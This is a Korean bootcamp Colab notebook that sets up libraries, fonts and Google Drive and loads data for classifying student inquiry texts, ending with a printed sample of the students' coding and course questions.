{"cells":[{"cell_type":"markdown","metadata":{"id":"NLHQ-NZQQYTI"},"source":["# **미니프로젝트 4차 1대1 문의 내용 유형 분류기**\n","# 단계3 : Text classification\n","\n","### 문제 정의\n","\u003e 1:1 문의 내용 분류 문제\u003cbr\u003e\n","\u003e 1. 문의 내용 분석\n","\u003e 2. 문의 내용 분류 모델 성능 평가\n","### 학습 데이터\n","\u003e * 1:1 문의 내용 데이터 : train.csv\n","\n","### 변수 소개\n","\u003e * text : 문의 내용\n","\u003e * label : 문의 유형\n","\n","### References\n","\u003e * Machine Learning\n","\u003e\u003e * [sklearn-tutorial](https://scikit-learn.org/stable/tutorial/text_analytics/working_with_text_data.html)\n","\u003e * Deep Learning\n","\u003e\u003e * [Google Tutorial](https://developers.google.com/machine-learning/guides/text-classification)\n","\u003e\u003e * [Tensorflow Tutorial](https://www.tensorflow.org/tutorials/keras/text_classification)\n","\u003e\u003e * [Keras-tutorial](https://keras.io/examples/nlp/text_classification_from_scratch/)\n","\u003e\u003e * [BERT-tutorial](https://www.tensorflow.org/text/guide/bert_preprocessing_guide)"]},{"cell_type":"markdown","metadata":{"id":"FlRWJB2w6Ip6"},"source":["## 1. 개발 환경 설정"]},{"cell_type":"markdown","metadata":{"id":"xP2-6FziQYTO"},"source":["### 1-1. 라이브러리 설치"]},{"cell_type":"code","execution_count":1,"metadata":{"colab":{"base_uri":"https://localhost:8080/"},"executionInfo":{"elapsed":11188,"status":"ok","timestamp":1680830100347,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"Wc7hyGL5QYTO","outputId":"c8d3c5a9-0f97-4fba-b5a7-47a3741e4050"},"outputs":[{"name":"stdout","output_type":"stream","text":["Looking in indexes: https://pypi.org/simple, https://us-python.pkg.dev/colab-wheels/public/simple/\n","Collecting konlpy\n","  Downloading konlpy-0.6.0-py2.py3-none-any.whl (19.4 MB)\n","\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m19.4/19.4 MB\u001b[0m \u001b[31m78.5 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n","\u001b[?25hRequirement already satisfied: gensim in /usr/local/lib/python3.9/dist-packages (4.3.1)\n","Requirement already satisfied: wordcloud in /usr/local/lib/python3.9/dist-packages (1.8.2.2)\n","Collecting python-mecab-ko\n","  Downloading python_mecab_ko-1.3.3-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (575 kB)\n","\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m575.6/575.6 KB\u001b[0m \u001b[31m51.9 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n","\u001b[?25hCollecting wget\n","  Downloading wget-3.2.zip (10 kB)\n","  Preparing metadata (setup.py) ... \u001b[?25l\u001b[?25hdone\n","Requirement already satisfied: lxml\u003e=4.1.0 in /usr/local/lib/python3.9/dist-packages (from konlpy) (4.9.2)\n","Collecting JPype1\u003e=0.7.0\n","  Downloading JPype1-1.4.1-cp39-cp39-manylinux_2_12_x86_64.manylinux2010_x86_64.whl (465 kB)\n","\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m465.3/465.3 KB\u001b[0m \u001b[31m47.3 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n","\u001b[?25hRequirement already satisfied: numpy\u003e=1.6 in /usr/local/lib/python3.9/dist-packages (from konlpy) (1.22.4)\n","Requirement already satisfied: scipy\u003e=1.7.0 in /usr/local/lib/python3.9/dist-packages (from gensim) (1.10.1)\n","Requirement already satisfied: smart-open\u003e=1.8.1 in /usr/local/lib/python3.9/dist-packages (from gensim) (6.3.0)\n","Requirement already satisfied: pillow in /usr/local/lib/python3.9/dist-packages (from wordcloud) (8.4.0)\n","Requirement already satisfied: matplotlib in /usr/local/lib/python3.9/dist-packages (from wordcloud) (3.7.1)\n","Collecting python-mecab-ko-dic\n","  Downloading python_mecab_ko_dic-2.1.1.post2-py3-none-any.whl (34.5 MB)\n","\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m34.5/34.5 MB\u001b[0m \u001b[31m16.6 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n","\u001b[?25hRequirement already satisfied: packaging in /usr/local/lib/python3.9/dist-packages (from JPype1\u003e=0.7.0-\u003ekonlpy) (23.0)\n","Requirement already satisfied: kiwisolver\u003e=1.0.1 in /usr/local/lib/python3.9/dist-packages (from matplotlib-\u003ewordcloud) (1.4.4)\n","Requirement already satisfied: cycler\u003e=0.10 in /usr/local/lib/python3.9/dist-packages (from matplotlib-\u003ewordcloud) (0.11.0)\n","Requirement already satisfied: python-dateutil\u003e=2.7 in /usr/local/lib/python3.9/dist-packages (from matplotlib-\u003ewordcloud) (2.8.2)\n","Requirement already satisfied: importlib-resources\u003e=3.2.0 in /usr/local/lib/python3.9/dist-packages (from matplotlib-\u003ewordcloud) (5.12.0)\n","Requirement already satisfied: contourpy\u003e=1.0.1 in /usr/local/lib/python3.9/dist-packages (from matplotlib-\u003ewordcloud) (1.0.7)\n","Requirement already satisfied: fonttools\u003e=4.22.0 in /usr/local/lib/python3.9/dist-packages (from matplotlib-\u003ewordcloud) (4.39.3)\n","Requirement already satisfied: pyparsing\u003e=2.3.1 in /usr/local/lib/python3.9/dist-packages (from matplotlib-\u003ewordcloud) (3.0.9)\n","Requirement already satisfied: zipp\u003e=3.1.0 in /usr/local/lib/python3.9/dist-packages (from importlib-resources\u003e=3.2.0-\u003ematplotlib-\u003ewordcloud) (3.15.0)\n","Requirement already satisfied: six\u003e=1.5 in /usr/local/lib/python3.9/dist-packages (from python-dateutil\u003e=2.7-\u003ematplotlib-\u003ewordcloud) (1.16.0)\n","Building wheels for collected packages: wget\n","  Building wheel for wget (setup.py) ... \u001b[?25l\u001b[?25hdone\n","  Created wheel for wget: filename=wget-3.2-py3-none-any.whl size=9676 sha256=25d2d1286a3145d8560f3b7f5ec9c50756c3f9ad29363faf08c4b4e17b2fe279\n","  Stored in directory: /root/.cache/pip/wheels/04/5f/3e/46cc37c5d698415694d83f607f833f83f0149e49b3af9d0f38\n","Successfully built wget\n","Installing collected packages: wget, python-mecab-ko-dic, python-mecab-ko, JPype1, konlpy\n","Successfully installed JPype1-1.4.1 konlpy-0.6.0 python-mecab-ko-1.3.3 python-mecab-ko-dic-2.1.1.post2 wget-3.2\n"]}],"source":["# 필요 라이브러리부터 설치할께요.\n","!pip install konlpy gensim wordcloud python-mecab-ko wget"]},{"cell_type":"markdown","metadata":{"id":"Mo7dF6PxQYTR"},"source":["### 1-2. 라이브러리 import"]},{"cell_type":"code","execution_count":2,"metadata":{"executionInfo":{"elapsed":4368,"status":"ok","timestamp":1680830114188,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"BmRkL4VkQYTR"},"outputs":[],"source":["from mecab import MeCab\n","import numpy as np\n","import matplotlib.pyplot as plt\n","import seaborn as sns\n","import wget,os\n","from IPython.display import display\n","import matplotlib.pyplot as plt\n","import pandas as pd\n","import matplotlib.font_manager as fm\n","import matplotlib.pyplot as plt\n","import tensorflow as tf\n","import nltk\n","import wget,os"]},{"cell_type":"markdown","metadata":{"id":"doyI5wIAQYTS"},"source":["### 1-3. 한글 글꼴 설정(Windows)"]},{"cell_type":"code","execution_count":null,"metadata":{"colab":{"base_uri":"https://localhost:8080/","height":90},"executionInfo":{"elapsed":14,"status":"ok","timestamp":1680788086454,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"ijz7iQcQQYTT","outputId":"4380c3d1-0b17-4175-d60f-d12425907b18"},"outputs":[{"data":{"application/vnd.google.colaboratory.intrinsic+json":{"type":"string"},"text/plain":["'if not os.path.exists(\"malgun.ttf\"): \\n    wget.download(\"https://www.wfonts.com/download/data/2016/06/13/malgun-gothic/malgun.ttf\")\\nif \\'malgun\\' not in fm.fontManager.findfont(\"Malgun Gothic\"):\\n    fm.fontManager.addfont(\"malgun.ttf\")\\nif plt.rcParams[\\'font.family\\']!= [\"Malgun Gothic\"]:\\n    plt.rcParams[\\'font.family\\']= [font for font in fm.fontManager.ttflist if \\'malgun.ttf\\' in font.fname][-1].name\\nplt.rcParams[\\'axes.unicode_minus\\'] = False #한글 폰트 사용시 마이너스 폰트 깨짐 해결\\nassert plt.rcParams[\\'font.family\\'] == [\"Malgun Gothic\"], \"한글 폰트가 설정되지 않았습니다.\"\\nFONT_PATH = \"malgun.ttf\"'"]},"execution_count":4,"metadata":{},"output_type":"execute_result"}],"source":["'''if not os.path.exists(\"malgun.ttf\"): \n","    wget.download(\"https://www.wfonts.com/download/data/2016/06/13/malgun-gothic/malgun.ttf\")\n","if 'malgun' not in fm.fontManager.findfont(\"Malgun Gothic\"):\n","    fm.fontManager.addfont(\"malgun.ttf\")\n","if plt.rcParams['font.family']!= [\"Malgun Gothic\"]:\n","    plt.rcParams['font.family']= [font for font in fm.fontManager.ttflist if 'malgun.ttf' in font.fname][-1].name\n","plt.rcParams['axes.unicode_minus'] = False #한글 폰트 사용시 마이너스 폰트 깨짐 해결\n","assert plt.rcParams['font.family'] == [\"Malgun Gothic\"], \"한글 폰트가 설정되지 않았습니다.\"\n","FONT_PATH = \"malgun.ttf\"'''"]},{"cell_type":"code","execution_count":3,"metadata":{"colab":{"base_uri":"https://localhost:8080/"},"executionInfo":{"elapsed":7753,"status":"ok","timestamp":1680830125840,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"T0jZawbGQYTT","outputId":"5f363c5e-540a-432c-e929-1433bb45ba0b"},"outputs":[{"name":"stdout","output_type":"stream","text":["Reading package lists... Done\n","Building dependency tree       \n","Reading state information... Done\n","The following NEW packages will be installed:\n","  fonts-nanum\n","0 upgraded, 1 newly installed, 0 to remove and 24 not upgraded.\n","Need to get 9,599 kB of archives.\n","After this operation, 29.6 MB of additional disk space will be used.\n","Get:1 http://archive.ubuntu.com/ubuntu focal/universe amd64 fonts-nanum all 20180306-3 [9,599 kB]\n","Fetched 9,599 kB in 3s (3,304 kB/s)\n","debconf: unable to initialize frontend: Dialog\n","debconf: (No usable dialog-like program is installed, so the dialog based frontend cannot be used. at /usr/share/perl5/Debconf/FrontEnd/Dialog.pm line 76, \u003c\u003e line 1.)\n","debconf: falling back to frontend: Readline\n","debconf: unable to initialize frontend: Readline\n","debconf: (This frontend requires a controlling tty.)\n","debconf: falling back to frontend: Teletype\n","dpkg-preconfigure: unable to re-open stdin: \n","Selecting previously unselected package fonts-nanum.\n","(Reading database ... 122349 files and directories currently installed.)\n","Preparing to unpack .../fonts-nanum_20180306-3_all.deb ...\n","Unpacking fonts-nanum (20180306-3) ...\n","Setting up fonts-nanum (20180306-3) ...\n","Processing triggers for fontconfig (2.13.1-2ubuntu3) ...\n"]}],"source":["!sudo apt-get install -y fonts-nanum"]},{"cell_type":"markdown","metadata":{"id":"FPIWluI-QYTT"},"source":["### 1-4. 자바 경로 설정(Windows)"]},{"cell_type":"code","execution_count":null,"metadata":{"id":"mgyL2ymRQYTU"},"outputs":[],"source":["#os.environ['JAVA_HOME'] = \"C:\\Program Files\\Java\\jdk-19\""]},{"cell_type":"markdown","metadata":{"id":"5gpEWWb0QYTU"},"source":["### 1-3. 한글 글꼴 설정(Colab)"]},{"cell_type":"code","execution_count":4,"metadata":{"colab":{"base_uri":"https://localhost:8080/"},"executionInfo":{"elapsed":2254,"status":"ok","timestamp":1680830138689,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"f0pC1tohQYTU","outputId":"918ef2ce-c8c3-41ad-eb9b-a34ccbfc30df"},"outputs":[{"name":"stdout","output_type":"stream","text":["Reading package lists... Done\n","Building dependency tree       \n","Reading state information... Done\n","fonts-nanum is already the newest version (20180306-3).\n","0 upgraded, 0 newly installed, 0 to remove and 24 not upgraded.\n"]}],"source":["!sudo apt-get install -y fonts-nanum"]},{"cell_type":"code","execution_count":5,"metadata":{"colab":{"base_uri":"https://localhost:8080/"},"executionInfo":{"elapsed":3,"status":"ok","timestamp":1680830140312,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"0dLK0Am4QYTV","outputId":"8a5bdd4c-b837-4d16-b16d-a347afda8b93"},"outputs":[{"name":"stdout","output_type":"stream","text":["NanumGothic\n"]}],"source":["FONT_PATH = '/usr/share/fonts/truetype/nanum/NanumGothic.ttf'\n","font_name = fm.FontProperties(fname=FONT_PATH, size=10).get_name()\n","print(font_name)\n","plt.rcParams['font.family']=font_name\n","assert plt.rcParams['font.family'] == [font_name], \"한글 폰트가 설정되지 않았습니다.\""]},{"cell_type":"markdown","metadata":{"id":"randZJubQYTV"},"source":["### 1-4. 구글드라이브 연결(Colab)"]},{"cell_type":"code","execution_count":6,"metadata":{"colab":{"base_uri":"https://localhost:8080/"},"executionInfo":{"elapsed":60069,"status":"ok","timestamp":1680830203063,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"35G68EedQYTV","outputId":"8c078444-9036-4ae4-c76d-bfdad03b5106"},"outputs":[{"name":"stdout","output_type":"stream","text":["Mounted at /content/drive\n"]}],"source":["from google.colab import drive\n","drive.mount('/content/drive')"]},{"cell_type":"code","execution_count":null,"metadata":{"colab":{"base_uri":"https://localhost:8080/","height":72},"executionInfo":{"elapsed":5,"status":"ok","timestamp":1680788156129,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"tFZ94s1ZSnBj","outputId":"79290a27-cf33-4530-d961-ac0e83054086"},"outputs":[{"data":{"application/vnd.google.colaboratory.intrinsic+json":{"type":"string"},"text/plain":["\"scipy.sparse.save_npz('/content/drive/MyDrive/10_mini04/x_train_n.npz', x_train_n)\\nnp.save('/content/drive/MyDrive/10_mini04/y_train.npy', y_train_n)\\nscipy.sparse.save_npz('/content/drive/MyDrive/10_mini04/x_test_n.npz', x_test_n)\\nnp.save('/content/drive/MyDrive/10_mini04/y_test.npy', y_test_n)\\n\\nnp.save('/content/drive/MyDrive/10_mini04/x_train_s.npy', x_train_s)\\nnp.save('/content/drive/MyDrive/10_mini04/x_test_s.npy', x_test_s)\""]},"execution_count":10,"metadata":{},"output_type":"execute_result"}],"source":["'''scipy.sparse.save_npz('/content/drive/MyDrive/10_mini04/x_train_n.npz', x_train_n)\n","np.save('/content/drive/MyDrive/10_mini04/y_train.npy', y_train_n)\n","scipy.sparse.save_npz('/content/drive/MyDrive/10_mini04/x_test_n.npz', x_test_n)\n","np.save('/content/drive/MyDrive/10_mini04/y_test.npy', y_test_n)\n","\n","np.save('/content/drive/MyDrive/10_mini04/x_train_s.npy', x_train_s)\n","np.save('/content/drive/MyDrive/10_mini04/x_test_s.npy', x_test_s)'''"]},{"cell_type":"markdown","metadata":{"id":"PVBGxfFAQYTW"},"source":["## 2. 전처리한 데이터 불러오기\n","* 1, 2일차에 전처리한 데이터를 불러옵니다.\n","* sparse data에 대해서는 scipy.sparse.load_npz 활용"]},{"cell_type":"code","execution_count":12,"metadata":{"executionInfo":{"elapsed":481,"status":"ok","timestamp":1680840495918,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"8XYj4r2P6NkF"},"outputs":[],"source":["# 오류 날시 판다스빼고 넘파이로 할 것\n","train=np.load('/content/drive/MyDrive/aivle/4차 미니프로젝트/train.npy', allow_pickle=True)\n","test=np.load('/content/drive/MyDrive/aivle/4차 미니프로젝트/test.npy', allow_pickle=True)"]},{"cell_type":"code","execution_count":40,"metadata":{"colab":{"base_uri":"https://localhost:8080/"},"executionInfo":{"elapsed":1165,"status":"ok","timestamp":1680841884472,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"fuE2p2KW-OOF","outputId":"e615cec8-f00f-4f7c-bebf-de920da9051c"},"outputs":[{"data":{"text/plain":["pandas.core.series.Series"]},"execution_count":40,"metadata":{},"output_type":"execute_result"}],"source":["path = '/content/drive/MyDrive/aivle/4차 미니프로젝트/test.csv'\n","x_test = pd.read_csv(path)\n","\n","x_test=x_test['text']\n","type(x_test)"]},{"cell_type":"code","execution_count":13,"metadata":{"executionInfo":{"elapsed":2,"status":"ok","timestamp":1680840496656,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"NPaLrTP-ly18"},"outputs":[],"source":["x_train = train[:, 0]\n","y_train = train[:, 1]\n","\n","x_test = test[:, 0]\n","y_test = test[:, 1]"]},{"cell_type":"code","execution_count":47,"metadata":{"executionInfo":{"elapsed":474,"status":"ok","timestamp":1680841980231,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"og4kOgxqm3wO"},"outputs":[],"source":["test = np.array(x_test)"]},{"cell_type":"code","execution_count":48,"metadata":{"colab":{"base_uri":"https://localhost:8080/"},"executionInfo":{"elapsed":26,"status":"ok","timestamp":1680841982968,"user":{"displayName":"라크샤사","userId":"01838305003834813418"},"user_tz":-540},"id":"lZhVjNen5dWo","outputId":"da7f97f5-97de-4261-ceb8-684a73a45029"},"outputs":[{"data":{"text/plain":["array(['팀즈는 노트북으로 접속하고 강의는 데스크톱 이용하려고 하는데 문제는 없을까요?  이 경우에는 다운받아야 되는 파일이 있을까요? 노트북 트래픽이 많아지면 소리부분 끊기거나 전체화면을 왔다갔다 하니까 놓치는 부분이 있어서 질문드립니다.',\n","       '셀프테스트에서 받은 점수가 해당 교육을 이수하고, 취업 연계등을 하는데 있어서 영향을 미치는 요소인가요?',\n","       \"a= int(input('정수 A의 값을 입력하시오.:'))\\nb= int(input('정수 B의 값을 입력하시오.:'))\\nc= int(input('정수 C의 값을 입력하시오.:'))\\nd= int(input('정수 D의 값을 입력하시오.:'))\\n\\nmaximum = a\\n\\nif b\u0026gt; maximum:\\n    b= maximum\\nif c\u0026gt; maximum:\\n    c= maximum\\nif d\u0026gt; maximum:\\n    d= maximum\\n    \\nprint(f'최대값은 {maximum}입니다')\\n\\n왜 최초에 설정한 a값만 나오는지 알수 있을까요?\",\n","       \"def max4(a,b,c,d):\\n    maximum = a\\n    if b\u0026gt;maximum:\\n        maximum=b\\n    if c\u0026gt;maximum:\\n        maximum=c\\n    if d\u0026gt;maximum:\\n        maximum=d\\n    return maximum\\n\\n\\nprint(f'max4(4,3,2,1) = {max4(4,3,2,1)}')\\nprint(f'max4(5,1,2,3) = {max4(5,1,2,3)}')\\nprint(f'max4(2,5,4,7) = {max4(2,5,4,7)}')\\nprint(f'max4(2,1,3,1) = {max4(2,1,3,1)}')\\nprint(f'max4(1,1,1,1) = {max4(1,1,1,1)}')\\nprint(f'max4(7,4,5,9) = {max4(7,4,5,9)}')\",\n","       'i**=2 가  i **=2 와 왜 같은지가 이해가 잘 안됩니다!!',\n","       \"print('a부터 b까지의 정수의 합을 구합니다.')\\na = int(input('정수 a를 입력하시오.:'))\\nb = int(input('정수 b를 입력하시오.:'))\\n\\nif a\u0026gt;b:\\n    a,b = b,a\\nsum = 0\\n\\nfor i in range(a,b+1):\\n    if i\u0026lt;b: print(f'{i}+',end=''\u0026gt;)\\n    sum +=i\\nelse:\\n    print(f'{i}=',end='')\\n    # sum +=i\\n    \\nprint(sum)\",\n","       \"print('a부터 b까지 정수의 합을 구합니다.')\\na = int(input('정수a를 입력하세요.:'))\\nb = int(input('정수b를 입력하세요.:'))\\n\\nif a \u0026gt; b : \\n    a,b = b,a\\n    \\nsum = 0\\n\\nfor i in range(a,b+1) : \\n    if i \u0026lt; b : \\n        print(f'{i} + ', end='')\\n    sum += i\\nprint(sum)\\n    \\nif a == b : \\n    print(f'{a} = {b}')\",\n","       'def electricPay(a) : \\n    if a =100 and a  200 : \\n        sum = 1600 + (100 * (60.7+125.9))+ (a-200) * 187.9\\n        sum = int(sum * (1 + 0.1 + 0.037))\\n    return sum\\n\\na = int(input(\\'전기사용량을 입력하세요.:\\'))\\nprint(f\\'한달 전기사용금액은 \"{electricPay(a)}원\"입니다.\\')\\n\\na = int(input(\\'전기사용량을 입력하세요.:\\'))\\nprint(f\\'한달 전기사용금액은 \"{electricPay(a)}원\"입니다.\\')',\n","       'def electricPay(kWh):\\n    pay = 0\\n    if kWh\u0026lt;100:\\n        pay = 410+(kWh*60.7)\\n        pay1=pay+(pay*0.1)\\n        pay2=pay1+(pay1*0.037)\\n        return pay2\\n\\n    if 100\u0026lt;= kWh \u0026lt;200:\\n        pay = ((910+(100*60.7)+(kWh*125.9))\\n        pay1=pay+(pay*0.1)\\n        pay2=pay1+(pay1*0.037)\\n        return pay2\\n               \\n    if 200\u0026lt;kWh: pay=(910+(100*60.7)+(100*125.9)+(kWh*187.9)) pay1=pay+(pay*0.1) pay2 return print(electricPay(34)) print(electricPay(140)) print(electricPay(250)) print(electricPay(300)) 들여쓰기 오류인거같은데 왜인지 모르겠습니다...어디가 잘못 구현된 걸까요?\u0026gt;',\n","       \"for i in range(11) : \\n    if i \u0026lt; 7 : \\n        print(f'{i+1} ', end ='')\\n    else : \\n        print(f'{i+2} ',end='')\",\n","       'n = int(input(\\'정수를 입력하세요 :\\'))\\n\\nfor i in range(n):\\n    for j in range(2,6):\\n        if n == i**j:\\n            print(i,j)            \\nelse:\\n    print(\"쌍이 없습니다\")\\n\\nelse문이 조건에 해당 안될때만 뽑히게 하고 싶은데 수정부분을 잘 모르겠습니다\\n이 상태에서는 쌍이 없을땐 정상 출력이지만 쌍이 있을땐 정상 출력 후, else까지 뽑히는것같아 어디를 수정해야할지 알려주시면 감사하겠습니다 !',\n","       '안녕하세요! 항상 친절하게 답변해주셔서 정말 감사드립니다.\\n강사님 설명봤는데 이해되었고 제 코드보다 훨씬 간결하게 좋네요 \\n그런데 이 코드에서 왜 오류가 나는지 잘모르겠습니다.\\nc = []\\nd=[]\\ndef ma(a, b):\\n    for i in range(1, a+1):\\n        if a %i == 0:\\n            c.append(i)\\n    for m in range(1, b+1):\\n        if b %m == 0:\\n            d.append(m)\\n    for j in c:\\n        for k in d:\\n            if j ==k:\\n                maxi = 1\\n                if maxi \u0026lt; j:\\n                    maxi = j\\n    return j\\na= int(input(\"a 입력\"))\\nb = int(input(\"b 입력\"))\\nprint(\"최대공약수 %d\" %(ma(a, b)))',\n","       \"1)split 메소드 결과 값에서 공백을 없애려면 ',   ' 이나 '/   ' 처럼 구분자 바로 뒤에 공백을 넣어줘야 하는데, 이건 split의 기본 설정이 공백이라서 공백을 한 번 더 넣어주면 공백이 사라진다고 이해하면 되는 걸까요?\\n\\n2)수업 자료에서 마크다운 셀 중간에 내용을 강조하는 **~** 가 반영되지 않는 경우가 있던데 강조 표시가 중간에 위치하게 되는 경우에는 반영이 되지 않는 건가요? 따로 다른 셀에 해봤을 땐 됐는데 해당 셀에서는 재시도를 해도 안 돼서 질문 남깁니다.\",\n","       '... 아무소리도 안들려서 테스트를 못했습니다 불이익 있을까요',\n","       '안녕하세요!\\n복습중에 궁금증이 생겨서 질문드립니다!\\n\\n1. s4 = \"아니면 \\\\\\' 또는 \\\\\\\\\\\\\"를 사용해도 됩니다.\" 를 출력하면\\n     아니면 \\\\\\' 또는 \\\\\"를 사용해도 됩니다.            로 출력이 되는데요\\n\\\\\\' 와 \\\\\\\\\\\\\"가 어떻게 같은지가 이해가 잘 안됩니다.',\n","       \"2. print('a + b =' , a + b)  a + b = 133.45600000000002  이 문장(?)에서  \\n  뒤에 소숫점을 자르려면 .2f 등의 방법(?)을 어떻게 사용하면 될까요?\",\n","       \"t=(4, 7, 5.6, 2, 3.14, 1)\\ns='string'\\na=['DTS', 'AAC', 'FLAC']\\n\\ndef min_of(a):\\n    minimum = a[0]\\n    for i in range(1, len(a)):\\n        if a[i] \u0026lt; minimum :\\n            minimum = a[i]\\n        return minimum\\n\\nprint(f'{min_of(t)}')\\nprint(f'{min_of(s)}')\\nprint(f'{min_of(a)}')\",\n","       \"num =int(input('원소수를 입력하시오:'))\\n\\nx= [None]*num\\nfor i in range(num):\\n    x[i]=int(input(f'x[{i}]값을 입력하시오.:'))\\ndef reverse_list(x):\\n    n = len(x)\\n    for i in range(n//2):\\n        x[i],x[n-i-1]=x[n-i-1],x[i]\\nreverse_list(x)\\nprint(x)\\n\\n원소수를 입력하시오:5\\nx[0]값을 입력하시오.:1\\nx[1]값을 입력하시오.:4\\nx[2]값을 입력하시오.:5\\nx[3]값을 입력하시오.:6\\nx[4]값을 입력하시오.:7\\n[7, 6, 5, 4, 1]\",\n","       \"다만 메세지의 출력 부분을 함수 안에 넣어서 코딩했는데 이대로도 문제 없을까요?\\n\\ndef lineG(a, key):\\n    b = a.copy()\\n    b.append(key)\\n    i = 0\\n    count = 0\\n    \\n    \\n    while True:\\n        count += 1\\n        if a[i] == key:\\n            break\\n        i += 1\\n    \\n    if i==len(b):\\n        print('검색결과 없음')\\n    \\n    else :\\n        print(f'검색결과 a[{i}]에 있음')\\n        print(f'보초법을 쓴 선형 검색에서 if문은 {count}번 실행되었다.')\\n\\n이렇게 만들었습니다.\",\n","       '금요일 수업의 경우 강의 영상은 월요일 17시에 업로드된다고 봤는데,\\n혹시 일부만이라도 당일이나 익일 업로드는 불가할까요?\\n주말동안 복습하고 싶어서요ㅜㅜ',\n","       '항상 자세한 답변 감사드립니다.\\n소수를 구하는 문제여서 나눠서 나머지가 0이 되는 경우가 2번이면 소수로 리스트에 추가하려고 하는 코드로 했는데 오류가 납니다.\\na = []\\nfor i in range(2, 1001):\\n    for j in range(1,i+1):\\n        cnt = 0\\n        if i % j == 0:\\n            cnt = cnt +1\\n        if cnt ==2:\\n            a.append(i)\\nprint(a)',\n","       'prime_number = []\\n\\nfor i in range(2, 1001) : \\n    flag = 0\\n    for j in range(2, i) :\\n        if i % j == 0 :\\n            flag = 1\\n            break\\n    \\n    if flag == 0 :\\n        prime_number.append(i)\\n    \\nprint(prime_number)',\n","       'git rebase -i HEAD~3을 실행하면 맨 위부터 [pick | 커밋 | 커밋메시지] 가 3개 나오는데\\npick을 reword로 변경하려면 reword 명령어를 입력하라는데 찾아보니 r 인 것 같아서 눌러보니 아무런 반응이 없더라구요.\\npick을 어떻게 reword로 바꾸나요??',\n","       '\\n\\ndef max_of(x): #최댓값 구하는 함수\\n    maximum = x[0]\\n    for i in range(1, len(x)):\\n        if x[i] \u0026gt; maximum:\\n            maximum = x[i]\\n    return maximum\\n\\n\\ndef bin_search(a, key):\\n    pl = 0\\n    pr = len(a)-1\\n    \\n    while True:\\n        pc = (pl + pr) // 2 #나눴을때의 몫으로 이동, 소숫점으로 나와서 이동하는 것을 방지하기위해서\\n        if a[pc] == key:\\n            return pc\\n        elif a[pc]  pr:\\n            break\\n    \\n    return -1\\n\\n               \\nx=[]\\ni=0\\nwhile True:\\n    n = input(f\\'x[{i}]값을 입력하세요.: \\')\\n    if n == \"end\":\\n        break\\n    x.append(int(n))   \\n    i+=1\\n    \\n\\n\\nindex2 = max_of(x) #최대값\\nindex = bin_search(x,index2) #찾는값\\n\\nprint(f\\'최대값은 {index2}입니다\\')\\nif index2 == -1:\\n    print(\\'검색값을 갖는 원소가 존재하지 않습니다.\\')\\nelse:\\n    print(f\\'최대값 {index2}은 a[{index}]에 있습니다.\\')\\n\\n\\n여기서 x리스트를 sort를 시키고 이진검색을 해야하는데 어디부분에 x.sorted()를 추가해야 정렬이 되는지 모르겠습니다,,!',\n","       ' 첨부 자료를 보면 리스트 a를 작성한 위치에 따라서 결과값이 다르게 나오는데 \\n왜 다른건지 모르겠습니다. \\n\\n 제가 알고있는 바로는 함수는 선언만 하고 사용할때만 작동이 되는거라\\n함수를 사용하기 전에만 선언하면 상관없는것으로 알았는데 답이 이렇게 나오니 혼동이 됩니다.',\n","       '[]를 사용하지 않고 list()함수만을 사용해 17,54,94,61,84와 같이 무작위 숫자를 리스트로 지정해 저장하는 방법은 없을까요?\\n',\n","       'a = 10\\nb = 20\\n# a, b = (b , a)       \\na, b = b, a          \\nprint(a, b)\\n--------------------\\n출력값 20 10\\n\\n선생님께서는 이것이 튜플이라 가능하다 하셨는데... 마법이 일어난걸까요..?\\n이해를 못하겠습니다 ㅠ',\n","       '테스트 케이스 3개 다 올바른 결과가 나왔는데 프로그래머스에 제출하니 정확성 테스트와 효율성테스트에 전부 실패가 떴습니다. 제가 생각해낸 방안이 틀린지 봐줄 수 있나요?\\n-------------\\n각 원소의 곱이 최대가 되려면 s의 절반이 되는 부분에서 원소의 곱이 최대가 됩니다.\\n그래서 저는 s-(s//2))로 s의 중간 원소를 바로 구해 answer에 넣었습니다.  그리고 s가 1인 경우에만 -1이 나오니 if로 제한을 걸었습니다.\\n-----------\\n# Q5 Answer template\\nimport math\\ndef solution(n, s):\\n    answer = []\\n    if s==1:\\n            answer.append(-1)\\n            return answer\\n    a=int(math.fabs(s-(s//2)))\\n    b=s//2\\n    answer.append(b)\\n    answer.append(a)\\n    return answer\\n-----------',\n","       '메소드에 대해서 질문드립니다!\\n\\n문제) 변수 a에 \\'I love you\\'를 저장하고 모든 문자를 대문자로 변환하여 출력하세요.\\n제 풀이) \\na = \\'i love you\\'\\na.upper()\\nprint(a)\\n\\n이렇게 할 경우 \\'i love you\\' 가 출력되는데,  \".upper()\" 이라는 메소드 출력값이 a에 저장되지 않고 바로 값을 넘겨주기 때문에 그런건가요? \\n그래서 변수 a 저장 뒤 1) a.upper() 또는 2) print(a.upper()) 을 해야 맞는건가요?',\n","       'jupyter command not found라고 뜹니다',\n","       '아래 사진과 같이 리스트 및 문자열 관련 메소드에서\\n문자열 메소드는 값을 직접 